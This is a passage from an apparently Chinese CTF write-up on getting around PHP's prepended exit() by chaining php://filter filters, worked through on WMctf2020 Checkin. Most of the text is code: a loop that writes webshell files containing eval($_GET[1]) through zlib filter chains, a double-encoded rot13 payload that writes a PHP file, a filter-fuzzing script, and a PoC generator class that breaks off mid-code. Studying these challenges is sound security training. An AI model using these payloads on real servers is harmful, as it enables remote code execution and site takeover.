class="hljs-string">&#x27;EUC-TW&#x27;</span>,    <span class="hljs-string">&#x27;CP950&#x27;</span>,    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,    <span class="hljs-string">&#x27;UHC&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,    <span class="hljs-string">&#x27;CP866&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,];@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);&#125;</code></pre></div><h2 id="例题：WMctf2020-Checkin"><a href="#例题：WMctf2020-Checkin" class="headerlink" title="例题：WMctf2020 Checkin"></a>例题：WMctf2020 Checkin</h2><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//PHP 7.0.33 Apache/2.4.25</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);@mkdir(<span class="hljs-variable">$sandbox</span>);@chdir(<span class="hljs-variable">$sandbox</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$content</span>))         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$content</span>))        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);&#125;</code></pre></div><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用二次编码绕过</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">content</span>=php://filter/write=string.%<span class="hljs-number">7</span>%<span class="hljs-number">32</span>ot<span class="hljs-number">13</span>|%<span class="hljs-number">3</span>C?cuc%<span class="hljs-number">20</span>cucvasb();?%<span class="hljs-number">3</span>E/resource=drom.php</code></pre></div><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用phpfuzz过滤器脚本看看哪些过滤器能用</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.toupper<span class="hljs-attribute">string</span>.tolower<span class="hljs-attribute">string</span>.strip_tags<span class="hljs-attribute">zlib</span>.deflate<span class="hljs-attribute">zlib</span>.inflate<span class="hljs-attribute">bzip2</span>.compress<span class="hljs-attribute">bzip2</span>.decompress<span class="hljs-attribute">ASCII</span><span class="hljs-attribute">EUC</span>-JP<span class="hljs-attribute">SJIS</span><span class="hljs-attribute">eucJP</span>-win<span class="hljs-attribute">SJIS</span>-win<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<span class="hljs-attribute">CP932</span><span class="hljs-attribute">CP51932</span><span class="hljs-attribute">SJIS</span>-mac<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO<span class="hljs-attribute">SJIS</span>-Mobile#KDDI<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI<span class="hljs-attribute">JIS</span><span class="hljs-attribute">JIS</span>-ms<span class="hljs-attribute">CP50220</span><span class="hljs-attribute">CP50220raw</span><span class="hljs-attribute">CP50221</span><span class="hljs-attribute">CP50222</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span><span class="hljs-attribute">byte2be</span><span class="hljs-attribute">byte2le</span><span class="hljs-attribute">byte4be</span><span class="hljs-attribute">byte4le</span><span class="hljs-attribute">HTML</span>-ENTITIES<span class="hljs-attribute">7bit</span><span class="hljs-attribute">8bit</span><span class="hljs-attribute">EUC</span>-CN<span class="hljs-attribute">CP936</span><span class="hljs-attribute">GB18030</span><span class="hljs-attribute">HZ</span><span class="hljs-attribute">EUC</span>-TW<span class="hljs-attribute">CP950</span><span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span><span class="hljs-attribute">EUC</span>-KR<span class="hljs-attribute">UHC</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span><span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span><span class="hljs-attribute">CP866</span><span class="hljs-attribute">KOI8</span>-R<span class="hljs-attribute">KOI8</span>-U<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div><p>最好用的应该就是<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变</p><p>这种方法就需要将前面的标签闭合，闭合后如果能够直接干掉exit最好，如果不行就只能用string.strip_tags过滤器再进行过滤</p><p>可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p><p>  <img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906205447664.png" alt="image-20200906205447664"></p><p>别的过滤器好像都没有变</p><h2 id="fuzz辅助脚本编写"><a href="#fuzz辅助脚本编写" class="headerlink" title="fuzz辅助脚本编写"></a>fuzz辅助脚本编写</h2><h3 id="过滤器字典："><a href="#过滤器字典：" class="headerlink" title="过滤器字典："></a>过滤器字典：</h3><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.rot<span class="hljs-number">13</span><span class="hljs-attribute">string</span>.toupper<span class="hljs-attribute">string</span>.tolower<span class="hljs-attribute">string</span>.strip_tags <span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode<span class="hljs-attribute">zlib</span>.deflate<span class="hljs-attribute">zlib</span>.inflate<span class="hljs-attribute">bzip2</span>.compress<span class="hljs-attribute">bzip2</span>.decompress<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode<span class="hljs-attribute">convert</span>.quoted-printable-encode<span class="hljs-attribute">convert</span>.quoted-printable-decode<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><span class="hljs-attribute">UTF7</span>-IMAP<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ASCII</span><span class="hljs-attribute">EUC</span>-JP<span class="hljs-attribute">SJIS</span><span class="hljs-attribute">eucJP</span>-win<span class="hljs-attribute">SJIS</span>-win<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<span class="hljs-attribute">CP932</span><span class="hljs-attribute">CP51932</span><span class="hljs-attribute">SJIS</span>-mac<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO<span class="hljs-attribute">SJIS</span>-Mobile#KDDI<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI<span class="hljs-attribute">JIS</span><span class="hljs-attribute">JIS</span>-ms<span class="hljs-attribute">CP50220</span><span class="hljs-attribute">CP50220raw</span><span class="hljs-attribute">CP50221</span><span class="hljs-attribute">CP50222</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span><span class="hljs-attribute">byte2be</span><span class="hljs-attribute">byte2le</span><span class="hljs-attribute">byte4be</span><span class="hljs-attribute">byte4le</span><span class="hljs-attribute">BASE64</span><span class="hljs-attribute">HTML</span>-ENTITIES<span class="hljs-attribute">7bit</span><span class="hljs-attribute">8bit</span><span class="hljs-attribute">EUC</span>-CN<span class="hljs-attribute">CP936</span><span class="hljs-attribute">GB18030</span><span class="hljs-attribute">HZ</span><span class="hljs-attribute">EUC</span>-TW<span class="hljs-attribute">CP950</span><span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span><span class="hljs-attribute">EUC</span>-KR<span class="hljs-attribute">UHC</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span><span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span><span class="hljs-attribute">CP866</span><span class="hljs-attribute">KOI8</span>-R<span class="hljs-attribute">KOI8</span>-U<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div><h3 id="phpfuzz过滤器"><a href="#phpfuzz过滤器" class="headerlink" title="phpfuzz过滤器"></a>phpfuzz过滤器</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = [    <span class="hljs-string">&#x27;string.rot13&#x27;</span>,    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,  <span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>,  <span class="hljs-string">&#x27;convert.quoted-printable-decode&#x27;</span>,    <span class="hljs-string">&#x27;zlib.deflate&#x27;</span>,    <span class="hljs-string">&#x27;zlib.inflate&#x27;</span>,    <span class="hljs-string">&#x27;bzip2.compress&#x27;</span>,    <span class="hljs-string">&#x27;bzip2.decompress&#x27;</span>,    <span class="hljs-string">&#x27;UCS-4&#x27;</span>,    <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,    <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,    <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,    <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-32&#x27;</span>,    <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-16&#x27;</span>,    <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,    <span class="hljs-string">&#x27;UTF-7&#x27;</span>,    <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8&#x27;</span>,    <span class="hljs-string">&#x27;ASCII&#x27;</span>,    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,    <span class="hljs-string">&#x27;SJIS&#x27;</span>,    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,    <span class="hljs-string">&#x27;CP932&#x27;</span>,    <span class="hljs-string">&#x27;CP51932&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,    <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;JIS&#x27;</span>,    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,    <span class="hljs-string">&#x27;CP50220&#x27;</span>,    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,    <span class="hljs-string">&#x27;CP50221&#x27;</span>,    <span class="hljs-string">&#x27;CP50222&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,    <span class="hljs-string">&#x27;byte2be&#x27;</span>,    <span class="hljs-string">&#x27;byte2le&#x27;</span>,    <span class="hljs-string">&#x27;byte4be&#x27;</span>,    <span class="hljs-string">&#x27;byte4le&#x27;</span>,    <span class="hljs-string">&#x27;BASE64&#x27;</span>,    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,    <span class="hljs-string">&#x27;7bit&#x27;</span>,    <span class="hljs-string">&#x27;8bit&#x27;</span>,    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,    <span class="hljs-string">&#x27;CP936&#x27;</span>,    <span class="hljs-string">&#x27;GB18030&#x27;</span>,    <span class="hljs-string">&#x27;HZ&#x27;</span>,    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,    <span class="hljs-string">&#x27;CP950&#x27;</span>,    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,    <span class="hljs-string">&#x27;UHC&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,    <span class="hljs-string">&#x27;CP866&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,];<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$item</span>))        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$item</span>,<span class="hljs-string">&quot;\n&quot;</span>;&#125;</code></pre></div><h3 id="poc生成脚本："><a href="#poc生成脚本：" class="headerlink" title="poc生成脚本："></a>poc生成脚本：</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [        <span class="hljs-string">&#x27;deflate&#x27;</span>,        <span class="hljs-string">&#x27;inflate&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [        <span class="hljs-string">&#x27;compress&#x27;</span>,        <span class="hljs-string">&#x27;decompress&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,        <span class="hljs-string">&#x27;ASCII&#x27;</span>,        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,        <span class="hljs-string">&#x27;SJIS&#x27;</span>,        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,        <span class="hljs-string">&#x27;CP932&#x27;</span>,        <span class="hljs-string">&#x27;CP51932&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;JIS&#x27;</span>,        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,        <span class="hljs-string">&#x27;CP50220&#x27;</span>,        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,        <span class="hljs-string">&#x27;CP50221&#x27;</span>,        <span class="hljs-string">&#x27;CP50222&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,        <span class="hljs-string">&#x27;byte2be&#x27;</span>,        <span class="hljs-string">&#x27;byte2le&#x27;</span>,        <span class="hljs-string">&#x27;byte4be&#x27;</span>,        <span class="hljs-string">&#x27;byte4le&#x27;</span>,        <span class="hljs-string">&#x27;BASE64&#x27;</span>,        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,        <span class="hljs-string">&#x27;7bit&#x27;</span>,        <span class="hljs-string">&#x27;8bit&#x27;</span>,        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,        <span class="hljs-string">&#x27;CP936&#x27;</span>,        <span class="hljs-string">&#x27;GB18030&#x27;</span>,        <span class="hljs-string">&#x27;HZ&#x27;</span>,        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,        <span class="hljs-string">&#x27;CP950&#x27;</span>,        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,        <span class="hljs-string">&#x27;UHC&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,        <span class="hljs-string">&#x27;CP866&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>        ],        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;        <span 